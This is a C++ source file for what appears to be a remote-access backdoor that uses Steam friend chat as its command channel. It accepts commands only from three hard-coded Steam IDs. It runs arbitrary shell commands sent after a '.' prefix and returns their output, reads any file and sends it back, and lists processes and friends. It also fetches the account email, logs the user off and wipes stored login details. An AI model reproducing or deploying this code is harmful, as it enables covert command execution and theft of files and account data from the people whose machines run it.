#include "../../SteamWorksWrapper/SteamWorksWrapper/include.h"

#include "Misc.h"
#include "mysql.h"

#include <ace/Thread.h>
#include <iostream>
#include <iomanip>
#include <memory>
#include <cstdio>
#include <stdexcept>
#include <string>
#include <TlHelp32.h>


#include <modes.h>
#include <aes.h>
#include <filters.h>

#define msg(caller, sndMsg) SteamWrap.m_gSteamFriends->ReplyToFriendMessage(caller, sndMsg); Sleep(170);
#define msgaltsleep(caller, sndMsg, sleep) SteamWrap.m_gSteamFriends->ReplyToFriendMessage(caller,sndMsg); Sleep(sleep);

/*
Auth system using SQL.

!auth add <steamid> <-- Existing checks?
!auth list <index(opt)>
!auth remove <index>
!auth purge <-- Confirm with y/n?
!auth path? <-- Needed?
!auth info <-- Generic info about the db
!auth edit <index> <new> <-- Would be nice.

*/


SteamWrapper SteamWrap;

ASQL *asql_Auth;



void exit_gracefully(int);


static void* steam_begincallback();
void handle_message(char*, CSteamID);
void message_magic(char*, CSteamID);
std::vector<std::wstring> retPsList();

int main(int argc, char *argv[])
{
	while (!SteamWrap.CheckRun(L"Steam.exe"))
	{
		printf("[ERR] - Steam not running, waiting 1 second.\n");
		Sleep(1000);

	}
	SteamWrap.SteamWrapperInit();
	FriendsStruct *friends = SteamWrap.GetFriendsFillStructure();
	if (friends == nullptr)
	{
		exit_gracefully(-1);
	}

	SteamWrap.DebugInfo();


	//asql_Auth = new ASQL("auth.db");
	//asql_Auth->TableExists("AUTH");

	for (int i = 0; i < SteamWrap.m_gSteamFriends->GetFriendCount(k_EFriendFlagImmediate); i++)
	{
		printf("[Name]: %s\n", *friends[i].name);
		printf("[SteamID]: %s\n", friends[i].cSteam.Render());
		if (strstr(*friends[i].name, "") != nullptr)
		{
			//printf("[Facebook ID]: %u\n", SteamWrap.m_gClientFriends->GetFriendFacebookID(friends[i].cSteam));
			//while (1)
			//{
				//SteamWrap.m_gClientFriends->RequestTrade(friends[i].cSteam);
				//SteamWrap.m_gClientFriends->InviteUserToGame(friends[i].cSteam, "");

				//Sleep(10000);
				/*
				SteamWrap.m_gClientFriends->VoiceCallNew(CSteamID((uint64)76561198017223248), friends[i].cSteam);
				HVoiceCall hVoice = SteamWrap.m_gClientFriends->FindFriendVoiceChatHandle(friends[i].cSteam);
				ECallState eState = SteamWrap.m_gClientFriends->GetCallState(hVoice);
				Sleep(1200);
				if (eState == 3)
				{

					SteamWrap.m_gClientFriends->VoiceHangUp(CSteamID((uint64)76561198017223248), hVoice);
					Sleep(1200);
				}
				hVoice = SteamWrap.m_gClientFriends->FindFriendVoiceChatHandle(friends[i].cSteam);
				SteamWrap.m_gClientFriends->VoiceHangUp(CSteamID((uint64)76561198017223248), hVoice);
				Sleep(100);
				hVoice = SteamWrap.m_gClientFriends->FindFriendVoiceChatHandle(friends[i].cSteam);
				SteamWrap.m_gClientFriends->VoiceHangUp(CSteamID((uint64)76561198017223248), hVoice);
				Sleep(100);
				hVoice = SteamWrap.m_gClientFriends->FindFriendVoiceChatHandle(friends[i].cSteam);
				SteamWrap.m_gClientFriends->VoiceCall(CSteamID((uint64)76561198017223248), friends[i].cSteam);
				Sleep(1200);
				*/
			//}
		}
	}



	ACE_thread_t *threadID = new ACE_thread_t;
	ACE_hthread_t *threadHandle = new ACE_hthread_t;

	//if (ACE_Thread::spawn_n(threadID, 2, (ACE_THR_FUNC)funcCallBack, 0, THR_JOINABLE, ACE_DEFAULT_THREAD_PRIORITY, 0, 0, threadHandle) == -1)
	if (ACE_Thread::spawn((ACE_THR_FUNC)steam_begincallback, 0, THR_JOINABLE, threadID, threadHandle, ACE_DEFAULT_THREAD_PRIORITY, 0, 0, 0, 0) == -1)
	{
		printf("Failed to spawn the callback thread!\n");
		return 0;
	}

	ACE_Thread::join(threadHandle);


	//steam_begincallback();

	while (1)
	{
		Sleep(200);
	}


	return 0;
}


static void* steam_begincallback()
{
	printf("[Callback Thread Began]\n");
	
	CallbackMsg_t callback;

	while (1)
	{
		while (Steam_BGetCallback(SteamWrap.m_hSteamPipe, &callback))
		{
			switch (callback.m_iCallback)
			{
				// What happens when we connect to the Steam Servers.
				case SteamServersConnected_t::k_iCallback:
				{
					printf("[m_iCallback] : SteamServersConnected_t : %d\n", callback.m_iCallback);
					printf("[Connect Success]\n");
					break;
				}

				// What happens when we disconnect from the Steam servers due to loss of connection or other means.
				case SteamServersDisconnected_t::k_iCallback:
				{
					printf("[m_iCallback] : SteamServersDisconnect_t : %d\n", callback.m_iCallback);
					SteamServersDisconnected_t *pDisconnected = (SteamServersDisconnected_t*)callback.m_pubParam;
					printf("[Disconnect from Steam!] - %u\n", pDisconnected->m_eResult);
					break;
				}

				// What happens when we fail to connect to Steam Servers.
				case SteamServerConnectFailure_t::k_iCallback:
				{
					printf("[m_iCallback] : SteamServerConnectFailure_t : %d\n", callback.m_iCallback);
					SteamServerConnectFailure_t *pConnectFail = (SteamServerConnectFailure_t*)callback.m_pubParam;
					printf("[Connect failed] - %u\n", pConnectFail->m_eResult);
					break;
				}

				// What happens when a friend messages us
				case FriendChatMsg_t::k_iCallback:
				{
					//printf("[m_iCallback] : FriendChatMsg_t : %d\n", callback.m_iCallback);
					FriendChatMsg_t *pFriendMsg = (FriendChatMsg_t*)callback.m_pubParam;
					EChatEntryType eMsgType;
					char szMsg[k_cchFriendChatMsgMax];
					memset(szMsg, 0, k_cchFriendChatMsgMax);

					int nLength = SteamWrap.m_gSteamFriends->GetFriendMessage(pFriendMsg->m_ulSenderID, pFriendMsg->m_iChatID, szMsg, sizeof(szMsg), &eMsgType);

					if (eMsgType == k_EChatEntryTypeChatMsg)
					{
						if (strstr(pFriendMsg->m_ulSenderID.Render(), "STEAM_0:0:28478760") != nullptr
							|| strstr(pFriendMsg->m_ulSenderID.Render(), "STEAM_0:1:56775119") != nullptr
							|| strstr(pFriendMsg->m_ulSenderID.Render(), "STEAM_0:1:101244445") != nullptr)
							// STEAM_1:1:3987728
						{
							// The main has messaged us.
							handle_message(szMsg, pFriendMsg->m_ulFriendID);

							//SteamWrap.m_gSteamFriends->ReplyToFriendMessage(pFriendMsg->m_ulFriendID, szMsg);
						}
						break;
					}
					if (eMsgType == k_EChatEntryTypeTyping)
					{
						printf("[Typing]: %s\n", SteamWrap.m_gSteamFriends->GetFriendPersonaName(pFriendMsg->m_ulFriendID));
						break;
					}
					break;
				}

				case PersonaStateChange_t::k_iCallback:
				{
					//printf("[m_iCallback] : PersonaStateChange_t : %d\n", callback.m_iCallback);
					//printf("----------------------------------------------\n");

					break;
				}

				case VoiceCallInitiated_t::k_iCallback:
				{
					VoiceCallInitiated_t *VoiceCall = (VoiceCallInitiated_t*)callback.m_pubParam;
					printf("[m_iCallback] : VoiceCallInitiated_t : %d\n", callback.m_iCallback);
					printf("[Voice] - Started with : %s\n", SteamWrap.m_gSteamFriends->GetFriendPersonaName(VoiceCall->m_ulSteamIDFriend));

					break;
				}

				case NotifyIncomingCall_t::k_iCallback:
				{
					NotifyIncomingCall_t *IncomingCall = (NotifyIncomingCall_t*)callback.m_pubParam;
					printf("[m_iCallback] : NotifyIncomingCall_t : %d\n", callback.m_iCallback);
					IncomingCall->m_ulSteamIDChat = CSteamID(IncomingCall->m_ulSteamID);
					printf("[Voice] : Incoming call from : %s\n", SteamWrap.m_gSteamFriends->GetFriendPersonaName(IncomingCall->m_ulSteamIDChat));

					break;
				}

				case SteamAPICallCompleted_t::k_iCallback:
				{
					SteamAPICallCompleted_t *apiCallCmplt = (SteamAPICallCompleted_t*)callback.m_pubParam;
					break;
				}
				
				case PurchaseMsg_t::k_iCallback:
				{
					PurchaseMsg_t *pMsgT = (PurchaseMsg_t*)callback.m_pubParam;
					break;
				}

				case PurchaseResponse_t::k_iCallback:
				{
					PurchaseResponse_t *pResponse = (PurchaseResponse_t*)callback.m_pubParam;
					break;
				}

				case RequestAppProofOfPurchaseKeyResponse_t::k_iCallback:
				{
					RequestAppProofOfPurchaseKeyResponse_t *pAppPoPK = (RequestAppProofOfPurchaseKeyResponse_t*)callback.m_pubParam;
					break;
				}

//				case Reque


			} // End of Switch(callback.m_iCallBack)
			//printf("[m_iCallback] : %d\n", callback.m_iCallback);
			Steam_FreeLastCallback(SteamWrap.m_hSteamPipe);
		} // End of while(Steam_BGetCallback())
		Sleep(100);
	} // End of while(1);

}


void handle_message(char *msg, CSteamID callee)
{
	if (msg == NULL)
		return;
	if (!callee.IsValid())
		return;

	if (msg[0] == '!')
	{
		printf("[CHAT COMMAND] : %s\n", msg);
		message_magic(msg, callee);
		return;
	}

	else if (msg[0] == '.')
	{
		std::string newCmd(msg);
		std::string newCmdExtracted(newCmd.substr(1, newCmd.size()));

		printf("[COMMAND]: %s\n", msg);

		FILE *fPipe;
		if ((fPipe = _popen(newCmdExtracted.c_str(), "rt")) == NULL)
			printf("Failed\n");

		//char maxBuf[k_cchFriendChatMsgMax];

		while (fgets(msg, k_cchFriendChatMsgMax, fPipe))
		{
			//strcat_s(maxBuf, sizeof(maxBuf), msg);
			msg(callee, msg);
			//ZeroMemory(maxBuf, sizeof(maxBuf));
		}
		if (feof(fPipe))
			_pclose(fPipe);
	}
	else
	{
		return; // Do nothing. Just a simple message
	}


	return;
}


void message_magic(char* szMsg, CSteamID callee)
{
	std::string uMsg(szMsg);

	if (uMsg.find("!email", 0) != std::string::npos)
	{
		char curEmail[256];
		bool IsValid;
		bool bRet = SteamWrap.m_gClientUser->GetEmail(curEmail, sizeof(curEmail), &IsValid);

		//int mRet = SteamGetCurrentEmailAddress(curEmail, 256, &EmailChars, &pError);
		msg(callee, curEmail);
		//msg(callee, (char*)IsValid);
		//SteamWrap.m_gSteamFriends->ReplyToFriendMessage(callee, curEmail);
		//return;
	}

	else if(uMsg.find("!logout", 0) != std::string::npos)
	{
		SteamWrap.m_gSteamFriends->ReplyToFriendMessage(callee, "[+] - Logging Off");
		Sleep(500);
		SteamWrap.m_gClientUser->LogOff();
		//return;
	}

	else if(uMsg.find("!logoffforget", 0) != std::string::npos)
	{
		SteamWrap.m_gClientUser->ClearAllLoginInformation();
		SteamWrap.m_gSteamFriends->ReplyToFriendMessage(callee, "[+] - Removed stored login information!");
		Sleep(500);
		SteamWrap.m_gSteamFriends->ReplyToFriendMessage(callee, "[+] - Logging Off");
		SteamWrap.m_gClientUser->LogOff();
		//return;

	}
	//else if (strstr("!help", szMsg) != nullptr)
	else if (uMsg.find("!help", 0) != std::string::npos)
	{
		msg(callee, "[----------------------------HELP-----------------------------]\n");
		msg(callee, "\t!email - Display users email ( doesn't work )\n");
		msg(callee, "\t!logoff - Logs off the user\n");
		msg(callee, "\t!logoffforget - Logs the user off and makes them retype information\n");
		msg(callee, "\t!help - Shows this help message.");
		msg(callee, "\t!friends - Lists the users friends\n");
		msg(callee, "\t.command - Runs a command on command line.\n");
		msg(callee, "\t!read - Reads a file and sends it back\n");
		msg(callee, "[--------------------------END HELP---------------------------]\n");
		//printf("[MAX MESSAGE SIZE] : %d\n", k_cchFriendChatMsgMax);
		//return;
	}

	else if (uMsg.find("!friends", 0) != std::string::npos)
	{
		for (int i = 0; i < SteamWrap.m_gSteamFriends->GetFriendCount(k_EFriendFlagImmediate); i++)
		{
			CSteamID fr = SteamWrap.m_gSteamFriends->GetFriendByIndex(i, k_EFriendFlagImmediate);
			std::string frMsg(SteamWrap.m_gSteamFriends->GetFriendPersonaName(fr));
			frMsg.append(":");
			frMsg.append(fr.Render());
			if (!(i + 1 > SteamWrap.m_gSteamFriends->GetFriendCount(k_EFriendFlagImmediate)))
			{
				CSteamID fr = SteamWrap.m_gSteamFriends->GetFriendByIndex(i + 1, k_EFriendFlagImmediate);
				frMsg.append(" || ");
				frMsg.append(SteamWrap.m_gSteamFriends->GetFriendPersonaName(fr));
				frMsg.append(":");
				frMsg.append(fr.Render());
			}

			msg(callee, frMsg.c_str());
			/*msg(callee, "---------------------------------------------------");
			msg(callee, SteamWrap.m_gSteamFriends->GetFriendPersonaName(fr));
			msg(callee, fr.Render());
			msg(callee, "---------------------------------------------------");
			//msg(callee, friendsstru)*/
		}
		//return;
	}

	else if (uMsg.find("!read", 0) != std::string::npos)
	{
		std::string newcmd(szMsg);
		if (newcmd.size() < 6)
		{
			msg(callee, "No argument supplied");
			return;
		}
		std::string newCmdExtracted(newcmd.substr(6, newcmd.size()));

		msg(callee, newCmdExtracted.c_str());

		std::string fileC;

		std::FILE *fp = std::fopen(newCmdExtracted.c_str(), "r");
		if (!fp)
		{
			msg(callee, "Failed to open the file!\n");
			return;
		}
		std::fseek(fp, 0, SEEK_END);
		msg(callee, "[---------------------------File Begin-------------------------]\n");

		if (std::ftell(fp) < k_cchFriendChatMsgMax) // File is small enough to send in one message
		{
			fileC.resize(std::ftell(fp));
			std::fseek(fp, 0, SEEK_SET);
			std::fread(&fileC[0], 1, fileC.size(), fp);
			std::fclose(fp);
			msg(callee, fileC.c_str());
			msg(callee, "[---------------------------EOF found-------------------------]\n");
			return;
		}


		std::fseek(fp, 0, SEEK_SET);
		//fileC.resize(k_cchFriendChatMsgMax);
		while (fgets(szMsg, 12288, fp))
		{
			msgaltsleep(callee, szMsg, 100);
			//fileC.empty();
			//fileC.resize(k_cchFriendChatMsgMax);
		}
		msg(callee, szMsg);
		if (feof(fp))
			_pclose(fp);

		msg(callee, "[---------------------------EOF found-------------------------]\n");
		
	}

	else if (uMsg.find("!pslist", 0) != std::string::npos)
	{
		std::vector<std::wstring> list = retPsList();

		for (std::wstring n : list)
		{
			std::string ps = ws2s(n);
			msgaltsleep(callee, ps.c_str(), 200);
		}

	}

	else
	{
		msg(callee, "[-] - No such command! Type !help\n");
		//return;
	}
	/*SteamWrap.m_gClientFriends->ClearChatHistory(callee);
	SteamWrap.m_gClientFriends->ClearChatRoomHistory(callee);
	SteamWrap.m_gClientFriends->TerminateChatRoom(callee);*/ // None of these work for some reason.
	return;
}


std::vector<std::wstring> retPsList()
{
	std::vector<std::wstring> psVec;
	HANDLE hProc = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
	if (hProc == INVALID_HANDLE_VALUE)
	{
		psVec.push_back(std::wstring(L"failed\n"));
		return psVec;
	}

	PROCESSENTRY32 procEnt;
	ZeroMemory(&procEnt, sizeof(PROCESSENTRY32));
	procEnt.dwSize = sizeof(PROCESSENTRY32);
	if (Process32First(hProc, &procEnt))
	{
		psVec.push_back(procEnt.szExeFile);

		while (Process32Next(hProc, &procEnt) && GetLastError() != ERROR_NO_MORE_FILES)
		{
			psVec.push_back(procEnt.szExeFile);
			//psVec.insert();
		}

		return psVec;
	}
	psVec.push_back(std::wstring(L"Something went wrong!\n"));
	return psVec;

}


void exit_gracefully(int mReason)
{
	switch (mReason)
	{
		case -1:
		{
			printf("[friends] nullptr\n");
			system("PAUSE");
			exit(0);
		}
	}
}


